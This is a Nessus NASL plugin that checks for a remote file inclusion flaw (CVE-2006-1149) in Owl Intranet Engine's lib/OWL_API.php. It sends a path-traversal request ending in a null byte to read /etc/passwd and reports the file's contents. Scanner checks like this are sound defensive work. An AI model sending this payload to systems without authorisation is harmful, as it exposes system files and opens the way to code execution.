#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(21025);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-1149");
  script_bugtraq_id(17021);
  script_xref(name:"OSVDB", value:"23734");

  script_name(english:"Owl Intranet Engine lib/OWL_API.php xrms_file_root Variable Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd via Owl");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that suffers from a remote
file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Owl Intranet Engine, a web-based document
management system written in PHP. 

The version of Owl Intranet Engine on the remote host fails to
sanitize user-supplied input to the 'xrms_file_root' parameter of the
'lib/OWL_API.php' script before using it in a PHP 'require_once'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/owl_082_xpl.pl" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/owl", "/intranet", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/lib/OWL_API.php?",
      "xrms_file_root=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(.+/etc/passwd\\0/include-locations\.inc.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening required '.+/etc/passwd\\0include-locations\.inc'")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) security_hole(port);
    else {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }

    exit(0);
  }
}
